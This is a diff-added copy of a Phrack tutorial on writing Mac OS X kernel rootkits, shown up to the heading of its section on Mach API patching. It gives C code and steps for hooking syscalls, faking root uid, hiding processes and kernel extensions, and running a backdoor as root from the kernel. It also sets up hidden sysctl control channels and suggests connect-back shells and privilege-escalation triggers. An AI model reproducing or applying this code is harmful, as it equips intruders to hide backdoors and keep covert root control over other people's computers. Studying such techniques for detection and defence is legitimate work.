@@ -1,0 +1,2125 @@
+				==Phrack Inc.==
+
+		Volume 0x0d, Issue 0x42, Phile #0x10 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=----------------=[ Developing Mac OSX kernel rootkits  ]=--------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[    By wowie <wowie@hack.se> &        ]=--------------=|
+|=---------------=[       ghalen@hack.se                 ]=--------------=|
+|=---------------=[                                      ]=--------------=|
+|=---------------=[    #hack.se                          ]=--------------=|
+|=-----------------------------------------------------------------------=|
+
+
+-[ Content
+
+1 - Introduction
+  1.1 - Background
+  1.2 - Rootkit basics
+  1.3 - Syscall basics
+  1.4 - Userspace and kernelspace
+2 - Introducing the XNU kernel
+  2.1 - OS X kernel rootkit history
+  2.2 - Finding the syscall entry table
+  2.3 - Opaque kernel structures
+  2.4 - The I/O Kit Framework
+3 - Kernel development on Mac OS X
+  3.1 - Kernel version dependence
+4 - Your first OS X kernel rootkit
+  4.1 - Replacement of a simple syscall
+  4.2 - Hiding processes 
+  4.3 - Hiding files
+  4.4 - Hiding a kernel extension
+  4.5 - Running userspace programs from kernelspace
+  4.6 - Controlling your rootkit from userspace
+5 - Runtime kernel patching using the Mach APIs
+  5.1 - System call hijacking
+  5.2 - Direct Kernel Object Manipulation
+6 - Detection
+  6.1 - Detecting hooked system calls on Mac OS X
+7 - Summary
+8 - References
+9 - Code
+
+--[ 1 - Introduction
+
+-[ 1.1 - Background
+
+Rootkits for different operating systems have been around for many years.
+Linux, Windows, and the different *BSD-flavors have all had their fair
+share of rootkits. Kernel rootkits are just a continuation of the standard
+file-swapping rootkits of days past. The dawn of tools like Osiris and
+Tripwire forced coders seeking to subvert the operating system to take
+refuge in kernelspace.
+
+The basic idea of a rootkit is to change the behavior and output of
+standard commands and tools to hide the presence of backdoors, sniffers
+and other types of malicious code. And just as within other parts of the
+security industry it is a continuing arms race between those who seek to
+subvert the kernel and those who seek to protect it.
+
+In this article we will describe the basics of runtime kernel patching and
+kernel rootkits for the Mac OS X operating system and how to develop your
+own. It is intended as an entry level tutorial for beginners and as well
+as guide for those interested in adapting existing kernel rootkits from
+other operating systems to Mac OS X. Apple supports two CPU architectures
+for the Mac OS X operating system: Intel and PowerPC. We believe that this
+guide is architecture neutral and that most of the source code is
+compatible with both architectures. 
+
+-[ 1.2 - Rootkit basics
+
+The purpose of a rootkit is to hide the presence of an intruder and his
+tools. In order to do this the most common features of a kernel rootkit is
+the ability to hide files, processes and network sockets. More advanced
+rootkits sometimes provide backdoors and keyboard sniffers.
+
+When a program such as '/bin/ls' is run to lists the files and folders of
+a directory it calls a function in the kernel called a syscall. The
+syscall is invoked from userland and transfers control from the userland
+process to the kernelspace function getdirentries(). The getdirentries()
+function returns a list of files for the specified directory to the
+userland process that in return displays the list to the user.
+
+In order to hide the presence of a specific file the data returned from
+the getdirentires() syscall needs to be modified and the entry for the
+file deleted before returning the data to the user. This can be
+accomplished in a number of different ways; one way is to modify the
+filesystem processing layer (VFS) and another is to directly modify the
+getdirentires() function.  In this brief introduction we will take the
+easy route and modify the getdirentries() function.
+
+-[ 1.3 - Syscall basics
+
+When a userland process needs to call a kernel function it invokes a
+syscall. A syscall is an API function that provides access to services
+provided by the kernel such as reading or writing to files, listing files
+in directories or opening and closing network sockets. Each syscall has a
+number, and all syscalls are invoked referencing this syscall number.
+
+When a userland process wants to invoke a kernel function it is almost
+always done through a wrapper function in the libc-library that in turn
+generates a software interrupt that transfers control from the userland
+process in to the kernel. The kernel stores a list of all available
+syscall functions in a table called the sysentry table, each entry has a
+function pointer to the location of the function for that syscall number.
+
+The kernel looks up the syscall that the userland process wants to call in
+the syscall entry table and invokes that function to handle the request.
+A list of the available syscalls as well as their numbers can be found in
+/usr/include/sys/syscall.h. For example, syscalls of interest to a rootkit
+wanting to hide files are: 
+
+196 - SYS_getdirentries
+222 - SYS_getdirentriesattr 
+344 - SYS_getdirentries64 
+
+Each of these entries in the table points to the function in the kernel
+responsible for returning a list of files. SYS_getdirentries is an older
+version of the function, SYS_getdirentriesattr is a similar version of
+with support for OS X specific attributes. SYS_getdirentries64 is a newer
+version that supports longer filenames. SYS_getdirentries is used by for
+example bash, SYS_getdirentries64 is used by the ls command and
+SYS_getdirentriesattr is used by pure OS X-integrated applications like
+the Finder. Each of these functions needs to be replaced in order to
+provide a seamless 'experience' for the end-user.
+
+In order to modify the output of the function a wrapper function needs to
+be created that can replace the original function. The wrapper function
+will first call the original function, search the output and do the
+required censoring before returning the sanitized data to the userland
+process.
+
+-[ 1.4 - Userspace and Kernelspace
+
+The kernel runs in a separate memory space that is private to the kernel
+in the same way as each user process has it's own private memory. This
+means that is is not possible to just read and write freely memory from
+the kernel. Whenever the kernel needs to modify memory in user-space, for
+instance copy data to or from userspace, specific routines and protocols
+needs to followed. A number of help functions are provided for this
+specific task, most notably copyin(9) and copyout(9). More information
+about these functions can be found in the manpages for copy(9) and
+store(9).
+
+--[ 2 - Introducing the XNU kernel
+
+XNU, the Mac OS X kernel and it's core is based on the Mach micro kernel
+and FreeBSD 5. The Mach layer is responsible for kernel threads,
+processes, pre-emptive multitasking, message-passing, virtual memory
+management and console i/o. Above the Mach layer is the BSD layer that
+supplies the POSIX API, networking and filesystems amongst other things.
+The XNU kernel also has an object oriented device driver framework known
+as the I/O Kit. This mashup of different technologies provide several
+different ways to accomplish the same task; to modify the running kernel.
+Another interesting choice in the design of the XNU kernel is that both
+the kernel- and userland has their own 4gb address space.
+
+
+-[ 2.1 - OS X kernel rootkit history
+
+One of the first publicly released Mac OS X kernel rootkits were WeaponX
+[9] which is developed by nemo [5] and was released in November 2004. It
+is based on the same kernel extension (loadable kernel module) technique
+that most kernel rootkits use and provides the expected basic
+functionality of a kernel rootkit. WeaponX [9] does however not work on
+newer versions of the Mac OS X operating system due to major kernel
+changes.
+
+In the latest few releases of Mac OS X Apple has done a couple things
+hardening the kernel and making it more difficult to subvert. Of
+particular interest is the fact that it no longer exports the sysentry
+table and that several of the key kernel structures are opaque and hidden
+from kernel developers.
+
+-[ 2.2 - Finding the syscall entry table
+
+As of OS X version 10.4 the sysentry table is no longer an exported symbol
+from the kernel. This means that the compiler will not be able to
+automatically identify the position in memory where the sysentry table is
+stored. This can either be solved by searching the memory for an
+appropriate looking table or using something else as a reference. Landon
+Fuller identified that the exported symbol nsysent (the number of entries
+in the sysentry table) is stored in close proximity to the sysentry table.
+He also wrote a small routine that finds the sysentry table and returns a
+pointer to it that can be used to manipulate the table as one see fit [1].
+
+The sysent structure is defined like this:
+
+struct sysent {
+        int16_t         sy_narg;                /* number of arguments */
+        int8_t          reserved;               /* unused value */
+        int8_t          sy_flags;               /* call flags */
+        sy_call_t       *sy_call;               /* implementing function */
+        sy_munge_t      *sy_arg_munge32;/* munge system call arguments for
+32-bit processes */
+        sy_munge_t      *sy_arg_munge64;/* munge system call arguments for
+64-bit processes */
+        int32_t         sy_return_type; /* return type */
+        uint16_t        sy_arg_bytes;   /* The size of all arguments for
+32-bit system calls, in bytes */
+}  *_sysent;
+
+
+The most interesting part of the structure is the "sy_call" pointer, which
+is a pointer to the actual syscall handler function. Thats the function we
+want our rootkit to hook. Hooking the function is as easy as changing the
+value of the pointer to point at our own function somewhere in memory.
+
+-[ 2.3 - Opaque kernel structures
+
+With OS X version 10.4 Apple also changed the kernel structure in order to
+provide a more stable kernel API. This was done to ensure that kernel
+extensions doesn't break when internal kernel structures change. This
+involves hiding large parts of the internal structures behind API:s and
+only exporting chosen parts of the structures to developers.
+
+A good example of this is the process structure called "proc". Which is
+available from both userland and kernelland. The userland version is
+defined in /usr/include/sys/proc.h and looks like this:
+
+struct extern_proc {
+        union {
+                struct {
+                        struct  proc *__p_forw; /* Doubly-linked run/sleep queue. */
+                        struct  proc *__p_back;
+                } p_st1;
+                struct timeval __p_starttime;   /* process start time */
+        } p_un;
+#define p_forw p_un.p_st1.__p_forw
+#define p_back p_un.p_st1.__p_back
+#define p_starttime p_un.__p_starttime
+        struct  vmspace *p_vmspace;     /* Address space. */
+        struct  sigacts *p_sigacts;     /* Signal actions, state (PROC ONLY). */
+        int     p_flag;                 /* P_* flags. */
+        char    p_stat;                 /* S* process status. */
+        pid_t   p_pid;                  /* Process identifier. */
+        pid_t   p_oppid;         /* Save parent pid during ptrace. XXX */
+        int     p_dupfd;         /* Sideways return value from fdopen. XXX */
+        /* Mach related  */
+        caddr_t user_stack;     /* where user stack was allocated */
+        void    *exit_thread;   /* XXX Which thread is exiting? */
+        int             p_debugger;             /* allow to debug */
+        boolean_t       sigwait;        /* indication to suspend */
+        /* scheduling */
+        u_int   p_estcpu;        /* Time averaged value of p_cpticks. */
+        int     p_cpticks;       /* Ticks of cpu time. */
+        fixpt_t p_pctcpu;        /* %cpu for this process during p_swtime */
+        void    *p_wchan;        /* Sleep address. */
+        char    *p_wmesg;        /* Reason for sleep. */
+        u_int   p_swtime;        /* Time swapped in or out. */
+        u_int   p_slptime;       /* Time since last blocked. */
+        struct  itimerval p_realtimer;  /* Alarm timer. */
+        struct  timeval p_rtime;        /* Real time. */
+        u_quad_t p_uticks;              /* Statclock hits in user mode. */
+        u_quad_t p_sticks;              /* Statclock hits in system mode. */
+        u_quad_t p_iticks;              /* Statclock hits processing intr. */
+        int     p_traceflag;            /* Kernel trace points. */
+        struct  vnode *p_tracep;        /* Trace to vnode. */
+        int     p_siglist;              /* DEPRECATED */
+        struct  vnode *p_textvp;        /* Vnode of executable. */
+        int     p_holdcnt;              /* If non-zero, don't swap. */
+        sigset_t p_sigmask;     /* DEPRECATED. */
+        sigset_t p_sigignore;   /* Signals being ignored. */
+        sigset_t p_sigcatch;    /* Signals being caught by user. */
+        u_char  p_priority;     /* Process priority. */
+        u_char  p_usrpri;       /* User-priority based on p_cpu and p_nice. */
+        char    p_nice;         /* Process "nice" value. */
+        char    p_comm[MAXCOMLEN+1];
+        struct  pgrp *p_pgrp;   /* Pointer to process group. */
+        struct  user *p_addr; /* Kernel virtual addr of u-area (PROC ONLY). */
+	u_short p_xstat;        /* Exit status for wait; also stop signal. */
+        u_short p_acflag;       /* Accounting flags. */
+        struct  rusage *p_ru;   /* Exit information. XXX */
+};
+
+
+The internal definition in the kernel is available from the xnu source in
+the file xnu-xxx/bsd/sys/proc_internal.h and contains a lot more info than
+it's userland counterpart. If we take a look at the userland version of
+the proc structure from Mac OS X 10.3, with Darwin 7.0, and compares it to
+the structure above we can spot the differences right away (some comments
+and whitespace is removed to save space and make it more readable)
+
+struct	proc {
+	LIST_ENTRY(proc) p_list;	/* List of all processes. */
+	struct	pcred *p_cred;		/* Process owner's identity. */
+	struct	filedesc *p_fd;		/* Ptr to open files structure. */
+	struct	pstats *p_stats;	/* Accounting/statistics (PROC ONLY). */
+	struct	plimit *p_limit;	/* Process limits. */
+	struct	sigacts *p_sigacts;	/* Signal actions, state (PROC ONLY). */
+#define	p_ucred		p_cred->pc_ucred
+#define	p_rlimit	p_limit->pl_rlimit
+	int	p_flag;			/* P_* flags. */
+	char	p_stat;			/* S* process status. */
+	char	p_pad1[3];
+	pid_t	p_pid;			/* Process identifier. */
+	LIST_ENTRY(proc) p_pglist;	/* List of processes in pgrp. */
+	struct	proc *p_pptr;	 	/* Pointer to parent process. */
+	LIST_ENTRY(proc) p_sibling;	/* List of sibling processes. */
+	LIST_HEAD(, proc) p_children;	/* Pointer to list of children. */
+#define	p_startzero	p_oppid
+	pid_t	p_oppid;	 /* Save parent pid during ptrace. XXX */
+	int	p_dupfd;	 /* Sideways return value from fdopen. XXX */
+	u_int	p_estcpu;	 /* Time averaged value of p_cpticks. */
+	int	p_cpticks;	 /* Ticks of cpu time. */
+	fixpt_t	p_pctcpu;	 /* %cpu for this process during p_swtime */
+	void	*p_wchan;	 /* Sleep address. */
+	char	*p_wmesg;	 /* Reason for sleep. */
+	u_int	p_swtime;	 /* DEPRECATED (Time swapped in or out.) */
+#define	p_argslen p_swtime	 /* Length of process arguments. */
+	u_int	p_slptime;	 /* Time since last blocked. */
+	struct	itimerval p_realtimer;	/* Alarm timer. */
+	struct	timeval p_rtime;	/* Real time. */
+	u_quad_t p_uticks;		/* Statclock hits in user mode. */
+	u_quad_t p_sticks;		/* Statclock hits in system mode. */
+	u_quad_t p_iticks;		/* Statclock hits processing intr. */
+	int	p_traceflag;		/* Kernel trace points. */
+	struct	vnode *p_tracep;	/* Trace to vnode. */
+	sigset_t p_siglist;		/* DEPRECATED. */
+	struct	vnode *p_textvp;	/* Vnode of executable. */
+#define	p_endzero	p_hash.le_next
+	LIST_ENTRY(proc) p_hash;	/* Hash chain. */
+	TAILQ_HEAD( ,eventqelt) p_evlist;
+#define	p_startcopy	p_sigmask
+	sigset_t p_sigmask;		/* DEPRECATED */
+	sigset_t p_sigignore;	/* Signals being ignored. */
+	sigset_t p_sigcatch;	/* Signals being caught by user. */
+	u_char	p_priority;	/* Process priority. */
+	u_char	p_usrpri;	/* User-priority based on p_cpu and p_nice. */
+	char	p_nice;		/* Process "nice" value. */
+	char	p_comm[MAXCOMLEN+1];
+	struct 	pgrp *p_pgrp;	/* Pointer to process group. */
+#define	p_endcopy	p_xstat
+	u_short	p_xstat;	/* Exit status for wait; also stop signal. */
+	u_short	p_acflag;	/* Accounting flags. */
+	struct	rusage *p_ru;	/* Exit information. XXX */
+	int	p_debugger;	/* 1: can exec set-bit programs if suser */
+	void	*task;			/* corresponding task */
+	void	*sigwait_thread;	/* 'thread' holding sigwait */
+	struct lock__bsd__ signal_lock;	/* multilple thread prot for signals*/
+	boolean_t	 sigwait;	/* indication to suspend */
+	void	*exit_thread;		/* Which thread is exiting? */
+	caddr_t	user_stack;		/* where user stack was allocated */
+	void * exitarg;			/* exit arg for proc terminate */
+	void * vm_shm;			/* for sysV shared memory */
+	int  p_argc;			/* saved argc for sysctl_procargs() */
+	int p_vforkcnt;		/* number of outstanding vforks */
+	void *  p_vforkact;     /* activation running this vfork proc */
+	TAILQ_HEAD( , uthread) p_uthlist; /* List of uthreads  */
+	pid_t	si_pid;
+	u_short si_status;
+	u_short	si_code;
+	uid_t	si_uid;
+	TAILQ_HEAD( , aio_workq_entry ) aio_activeq;
+	int		aio_active_count;	/* entries on aio_activeq */
+	TAILQ_HEAD( , aio_workq_entry ) aio_doneq;
+	int		aio_done_count;		/* entries on aio_doneq */
+	struct klist p_klist;  /* knote list */
+	struct  auditinfo		*p_au;	/* User auditing data */
+#if DIAGNOSTIC
+#if SIGNAL_DEBUG
+	unsigned int lockpc[8];
+	unsigned int unlockpc[8];
+#endif /* SIGNAL_DEBUG */
+#endif /* DIAGNOSTIC */
+};
+
+As you can seen, Apple has redone this structure quite a bit and removed
+a lot of stuff, most of the changes where introduced between version 10.3
+and 10.4 of Mac OS X. One of the changes to the structure is the removal
+of the p_ucred pointer, which is a pointer to a structure that contains
+the user credentials of the current process. 
+
+This effectively breaks nemos [5] technique of setting a process user-id
+and group-id to zero, which he does like this:
+
+void uid0(struct proc *p) {
+	register struct pcred *pc = p->p_cred;
+	pcred_writelock(p);
+	(void)chgproccnt(pc->p_ruid, -1);
+	(void)chgproccnt(0, 1);
+	pc->pc_ucred = crcopy(pc->pc_ucred);
+	pc->pc_ucred->cr_uid = 0;
+	pc->p_ruid = 0;
+	pc->p_svuid = 0;
+	pcred_unlock(p);
+	set_security_token(p);
+	p->p_flag |= P_SUGID;
+	return;
+}
+
+For a rootkit developer that wants to modify specific kernel structures
+this is somewhat of a problem, both the fact that the kernel structures
+are neither exported or well documented and the fact that they might
+rapidly change between kernel versions. Fortunately the kernel source is
+now open source and can be freely downloaded from Apple. This makes it
+possible to extract the needed kernel structures from the source.
+
+-[ 2.4 - The I/O Kit Framework
+
+Mac OS X contains a complete framework of libraries, tools and various
+other resources for creating device drivers. This framework is called the
+I/O Kit. The I/O Kit framework provides an abstract view of the hardware
+to the upper layers of Mac OS X, which simplifies device driver
+development and thus makes it's less time consuming. The entire framework
+is object-oriented and implemented using a somewhat cut down version C++
+to promote increased code reuse.
+
+Since this framework operates in kernelspace and can interact with actual
+hardware, it's ideal for writing keylogging software. A good example of
+abusing the I/O Kit framework for just that purpose is the keylogger
+called "logKext", [10] written by drspringfield, which utilizes the I/O
+Kit framework to log a users keystrokes. This is just one of many uses of
+this framework in rootkit development. Feel free to explore and come up
+with your own creative ways of subverting the Mac OS X kernel using the
+I/O Kit framework.
+
+--[ 3 - Kernel development on Mac OS X
+
+As Mac OS X is somewhat of a hybrid between a number of different
+technologies runtime modification of the operating system  can be done in
+several ways. One of the easiest methods is to load the 'improved'
+functionality as a kernel driver. Drivers can be loaded either as kernel
+extensions for the BSD sub-layer or as Object Oriented I/O Kit drivers.
+For the purpose of this first exercise only ordinary BSD kernel extensions
+will be utilized due to their simplicity and ease of development.
+
+The easiest way to write a kernel extension for Mac OS X is to use the
+XCode-templates for 'Generic Kernel Extension'. Open Xcode, Select 'New
+Project' in the File-menu. From the list of available templates choose
+'Generic Kernel Extension' under 'Kernel Extension'. Give the project a
+suitable name, such as 'rootkit 0.1' and click 'Finish'. This creates a
+new Xcode project for your new kernel rootkit.
+
+The newly automatically created .c-file contains the entry and exit points
+for the kernel extension: 
+
+kern_return_t rootkit_0_1_start (kmod_info_t * ki, void * d) {
+    return KERN_SUCCESS;
+}
+
+
+kern_return_t rootkit_0_1_stop (kmod_info_t * ki, void * d) {
+    return KERN_SUCCESS;
+}
+
+rootkit_0_1_start() will be invoked when the kernel extension is loaded
+using /sbin/kextload and rootkit_0_1_stop() will be invoked when the
+kernel extension is unloaded using /sbin/kextunload. 
+
+Loading and unloading of kernel extensions require root privileges, and
+the code in these functions will be executed in kernelspace with full
+control of the entire operating system. It is therefore of the utmost
+importance that any code executed takes makes sure not to make a mess of
+everything and thereby crashes the entire operating system. To quote the
+Apple 'Kernel Program Guide': "Kernel programming is a black art that
+should be avoided if at all possible" [4].
+
+Any changes made to the kernel in the start()-function must be undone in
+the stop-function(). Functions, variables and other types of loadable
+objects will be deallocated when the module is unloaded and any future
+reference to them will cause the operating system to misbehave or in worst
+case crash.
+
+Building your project is as easy as clicking the 'build button'. The
+compiled kernel extension can be found in the build/Relase/-directory and
+is named 'rootkit 0.1.kext'. /sbin/kextload refuses to load kernel
+extensions unless they are owned by the root user and belongs to the wheel
+group. This can easily be fixed by chown:ing the files accordingly.
+Fledging kernel hackers that dislikes the Xcode GUI:s will be please to
+known that the project can be build just as easily from the command line
+using the 'xcodebuild' command. 
+
+Apple provides the XCode IDE and the gcc compiler on the Mac OS X DVD, if
+needed the latest version can also be downloaded from [2] after
+registration.  The source code for the XNU kernel can also be downloaded
+from [3]. It is recommended that you keep a copy of the kernel sourcecode
+at hand as reference during development.
+
+One of the great advantages of using the kernel extension API is that the
+kextload command takes care of everything from linking to loading. This
+means that the entire rootkit can be written in C, making it almost
+trivially easy. Another great advantage of C-development is portability
+which is an important issue considering that Mac OS X is available for two
+different CPU architectures.
+
+-[ 3.1 - Kernel version dependence
+
+As Landon Fuller notes in research access to the nsysent variable needed
+to find the sysentry-table is restricted unless the kext is compiled for a
+specific kernel release. This is due to the simple fact that the address
+of this variable is likely to change between kernel releases. Kernel
+dependence for kernel extensions is configured in the Info.plist file
+included in the XCode-project. The 'com.apple.kernel'-key needs to be
+added to OSBundleLibraries with the version set to the Kernel release as
+indicated by the 'uname -r' command:
+
+<key>OSBundleLibraries</key>
+<dict>
+    <key>com.apple.kernel</key>
+    <string>9.6.0</string>
+</dict>
+
+This ties the compiled kernel extension specifically to version 9.6.0 of
+the Kernel. A recompile of the kernel extension is needed for each minor
+and major release. The kernel extension will refuse to load in any other
+version of the Mac OS X kernel, in many cases that might be considered a
+good thing.  
+
+--[ 4 - Your first OS X kernel rootkit
+
+-[ 4.1 - Replacement of a simple syscall
+
+To start of the whole kernel subversion business we'll take a quick
+example of replacing the getuid() function. This function returns the
+current user ID and in this example it will be replaced it with a function
+that always returns uid zero (root). This will not automatically give all
+users root access, only the illusion of having root access. Fun but
+innocent :)
+
+int new_getuid()
+{
+  return(0); 
+}
+
+kern_return_t rootkit_0_1_start (kmod_info_t * ki, void * d) {
+
+  struct sysent *sysent = find_sysent();
+  sysent[SYS_getuid].sy_call = (void *) new_getuid;
+
+  return KERN_SUCCESS;
+
+}
+
+This simple code-snippet first defines a new getuid()-function that always
+returns 0 (root). The new function will be loaded in kernel memory by the
+kextload-function. When the start()-function runs it will replace the
+original getuid() syscall with the new and 'improved' version. Returning 
+KERN_SUCCESS indicates to the operating system that everything went as 
+planed and that the insertion of the kernel extension was successful.
+
+A complete version can be found in the code section of this paper;
+including the unloading function that might prove useful once the initial
+thrill is over. 
+
+-[ 4.2 - Hiding processes 
+ 
+The '/bin/ps' command, 'top' and the Activity Monitor all list running
+processes using the sysctl(3) syscall. sysctl(2) is a general purpose
+multifunction API used to communicate with a multitude of different
+functions in the kernel. sysctl(2) is used both to list running processes
+as well open network sockets. In order to intercept and modify the running
+process list the entire sysctl syscall needs to be intercepted and the
+commands parsed in order to identify calls to the CTL_KERN->KERN_PROC
+command used to list current running processes.
+
+The sysctl(2) syscall is intercepted using the exactly same method as
+getuid(), but one of the major differences is that special attention needs
+to be taken with regards to the arguments. In order to support both big
+and little endian systems Apple uses padding macros named PADL and PADR
+that makes the argument struct look very exotic. The easiest way to get it
+right is to copy the entire struct definition from the XNU kernel source
+in order to avoid confusion with the padding. 
+
+sysctl(2) takes its function commands in the form of a char-array called
+'name'. The commands are hierarchical and most commands have several
+subcommands that in turn can have subcommands or arguments. The sysctl(2)
+commands and their respective subcommands can be found in
+'/usr/include/sys/sysctl.h'.
+
+The CTL_KERN->KERN_PROC command to sysctl copies a list of all running
+processes to a user provided buffer. From the perspective of the rootkit
+this presents a problem since we want to modify the data before it is
+returned to the user but since the syscall writes the data directly to the
+user provided buffer this is problematic. Fortunately we are in position
+to manipulate the data in the user buffer prior returning control to the
+user software. This requires copying the data from userspace into a
+kernelspace buffer, doing the required modification and then copying the
+data back into userspace.
+
+First memory needed to store the copy of the data needs to be allocated
+using the MALLOC-macro, then the data needs to be copied from userspace
+using the copyin(9)-function. The copyin(9) function copies data from
+userspace to kernelspace. Then the data needs to be processed and selected
+entries removed. The actual process of deleting an entry is done by
+overwriting it with the rest of the data in the buffer. This requires
+doing an overlapping memory copy, this functionality is provided by the
+bcopy(3) function. Once an entry has been removed the counter for the
+total size of the buffer needs to be decreased and the data can finally be
+returned, or rather copied, to userspace. 
+
+      /* Search for process to remove */
+      for (i = 0; i < nprocs; i++) 
+        if(plist[i].kp_proc.p_pid == 11) /* hardcoded PID */
+          { 
+
+            /* If there is more then one entry left in the list 
+	     * overwrite this entry with the rest of the buffer */
+
+            if((i+1) < nprocs)
+              bcopy(&plist[i+1],&plist[i],(nprocs - (i + 1)) * sizeof(struct kinfo_proc));
+            
+            /* Decrease size */
+	    oldlen -= sizeof(struct kinfo_proc);
+            nprocs--;
+          }
+
+The modified data is then copied back to the userspace buffer using the
+copyout(9) function. In this case two different functions are used to copy
+data to userspace. The suulong(9) function is used to copy only small
+amounts of data to userspace while copyout(9) is used to copy the actual
+data buffer.
+
+      /* Copy back the length to userspace */
+      suulong(uap->oldlenp,oldlen);
+
+      /* Copy the data back to userspace */
+      copyout(mem,uap->old, oldlen);
+
+
+The data trailing the last entry will, if the data was modified, contain
+an extra copy of the last entry in the buffer, something that might be
+used to detect that the buffer has been modified. To avoid this the
+trailing data can be zero:ed. A more sophisticated rootkit might want to
+store a copy of the original buffer prior to the call to the real syscall
+and use that data to pad the remaining buffer space. 
+
+A reference implementation of a processes hiding kernel extension can be 
+found in the code section of this paper.
+
+-[ 4.3 - Hiding files
+
+As noted earlier, three different syscalls are of interest when hiding
+files, SYS_getdirentries, SYS_getdirentriesattr and SYS_getdirentries64.
+All of these syscalls share the sysctl(2) approach in that the calling
+application provides a buffer that the syscall will fill with appropriate
+data and return a counter indicating how much data was written. Due to the
+variable size of each record pointer arithmetics is required when parsing
+the data. All in all it is a complicated procedure and any mishaps is
+likely to cause a kernel crash. It is also important to patch all three
+syscalls of the getdirent-syscall in order to maintain the illusion that
+the malicious files have disappeared.
+
+The process is very similar to hiding a process; the original function is
+invoked, the data copied from userspace to kernelspace, modified as needed
+and then copied back. 
+
+A reference implementation of a file hiding kernel extension can be found
+in the code section of this paper.
+
+-[ 4.4 - Hiding a kernel extension
+
+Kernel modules can be listed with the command 'kextstat'. If the rogue
+rootkit kernel extension can be easily identified using the kextstat
+commands it sort of voids the purpose of the rootkit. nemo [5] identified
+a simple and elegant way to hide the presence of a kernel module for the
+WeaponX [9] kernel rootkit. 
+
+extern kmod_info_t *kmod; 
+
+void activate_cloaking() 
+{ 
+        kmod_info_t *k; 
+        k = kmod; 
+        kmod = k->next; 
+}
+
+This short snippet of code finds the linked list containing the loaded
+modules and simply delinks the last loaded module from that list. Since
+the kextstat utility will walk this list when presenting the information
+on loaded kernel extensions the newly loaded rootkit will disappear from
+that list. For the same reason the kextunload utility will also fail to
+unload the module from the kernel, which actually can be quite annoying.
+
+-[ 4.5 - Running userspace programs from kernelspace
+
+On Mac OS X there exists a special API called KUNC (Kernel-User
+Notification Center) [6]. This API is used when the kernel (i.e. a KEXT)
+might need to display a notification to the user or run commands in
+userspace.
+
+The KUNC function used to execute commands in userspace is KUNCExecute().
+This function is quite handy in rootkit development, since we may execute
+any command we want as root from kernelspace. The function definition
+looks like this.
+
+(Taken from xnu-xxx/osfmk/UserNotification/KUNCUserNotifications.h)
+
+#define kOpenApplicationPath    0
+#define kOpenPreferencePanel    1
+#define kOpenApplication        2
+
+#define kOpenAppAsRoot          0
+#define kOpenAppAsConsoleUser   1
+
+kern_ret_t
+KUNCExecute(char *executionPath, int openAsUser, int pathExecutionType);
+
+The "executionPath" is the file-system path to the application or
+executable to execute. The "openAsUser" flag can either be
+"kOpenAppAsConsoleUser", to execute the application as the logged-in user
+or "kOpenAppAsRoot", to run the application as root. The
+"pathExecutionType" flag specifies the type of application to execute, and
+can be one of the following.
+
+kOpenApplicationPath - The absolute file-system path to a executable.
+kOpenPreferencePanel - The name of a preference pane in
+/System/Library/PreferencePanes.
+kOpenApplication - The name of a application in the "/Applications" folder.
+
+To execute the binary "/var/tmp/mybackdoor" we simply do like this:
+
+KUNCExecute("/var/tmp/mybackdoor", kOpenAppAsRoot, kOpenApplicationPath);
+
+This function is especially useful in combination with some sort of
+trigger, like a hooked tcp-handler that executes the function and spawns a
+connect-back shell to the source-ip of a magic trigger-packet. The
+interesting parts of the network layer is actually exported and can be 
+easily modified. 
+
+Or if you prefer a local privilege escalation backdoor, why not hook
+SYS_open and execute the specified file with KUNCExecute if you supply a
+magic flag? The possibilities are endless.
+
+-[ 4.6 - Controlling your rootkit from userspace
+
+Once the appropriate syscalls and kernel functions has been replaced with
+rogue versions capable of hiding files, network sockets and processes each
+of these needs to know what to hide. 
+
+A popular way to trigger process hiding is to hook SYS_kill and send a
+special signal (31337 perhaps?) to the process to hide. This is easy and
+requires no special tools of any kind. If the processes hiding is
+performed by setting special flags on the process this flag can be
+inherited for fork() and exec() and thereby hide an entire process-tree. 
+
+Hiding files and sockets is trickier since we have no easy way to indicate
+to the kernel that we want them hidden. The creation of a new syscall is
+an easy way, or to piggy-back on one of the hooked ones and have a special
+magic argument to trigger the communication code. This does however
+require special tools in userspace capable of calling the right syscall
+with the correct arguments. These tools can be identified and searched for
+even if the rootkit tries to hide them in the filesystem they are always
+vulnerable to offline analysis. 
+
+An easy way to create a communication channel that doesn't require special
+tools or an entry in the /dev/-directory is to use sysctl. In the Mac OS X
+kernel drivers can register their own variables and have them changed
+using the /usr/sbin/sysctl-tool which is available by default on all
+systems. 
+
+Registering a new sysctl can be easily done using the normal kext
+procedures. The source for the example below can be found in reference 7.
+
+/* global variable where argument for our sysctl is stored */
+int  sysctl_arg = 0;
+
+static int sysctl_hideproc SYSCTL_HANDLER_ARGS 
+{     
+      int error;     
+      error = sysctl_handle_int(oidp, oidp->oid_arg1,oidp->oid_arg2, req); 
+		
+     if (!error && req->newptr) 
+      {         
+	 if(arg2 == 0)
+	   printf("Hide process %d\n",sysctl_arg);
+	 else	       
+	   printf("Unhide process %d\n",sysctl_arg);
+       }
+       
+   /* We return failure so that we dont show up in "sysclt -A"-listings. */
+   return KERN_FAILURE;
+}
+       
+       
+/* Create our sysctl:s */
+SYSCTL_PROC(_hw, OID_AUTO, hideprocess,CTLTYPE_INT|CTLFLAG_ANYBODY|CTLFLAG_WR,
+	    &sysctl_arg, 0, &sysctl_hideproc , "I", "Hide a process"); 
+
+SYSCTL_PROC(_hw, OID_AUTO, unhideprocess,CTLTYPE_INT|CTLFLAG_ANYBODY|CTLFLAG_WR,
+	    &sysctl_arg, 1, &sysctl_hideproc , "I", "Unhide a process"); 
+
+
+kern_return_t kext_start (kmod_info_t * ki, void * d) {
+
+    /* Register our sysctl */
+    sysctl_register_oid(&sysctl__hw_hideprocess);
+    sysctl_register_oid(&sysctl__hw_unhideprocess);
+
+    return KERN_SUCCESS;
+}
+
+This code registers two new sysctl variables, hw.hideprocess and
+hw.unhideprocess. When written to using sysctl -w hw.hideprocess=99 the
+function sysctl_hideproc() is invoked and can be used to add the selected
+PID to the list of processes to hide. A sysctl for hiding files is
+slightly different since it takes a string as argument instead of an
+integer but the overall procedure is the same. The major reason to use
+sysctl is that it support dynamic registration of variable and the
+required tool sysctl is provided by the operating system. 
+
+The -A flag for sysctl is avoided by returning KERN_FAILURE whenever the
+function is called, this causes the newly created variables to be omitted
+from the listing. 
+
+There is also a number of other ways of communicating with the kernel and
+controlling your rootkit. For example you can use the Mach API for IPC or
+using kernel control sockets, both has their pros and cons.
+
+--[ 5 - Runtime kernel patching using the Mach APIs
+
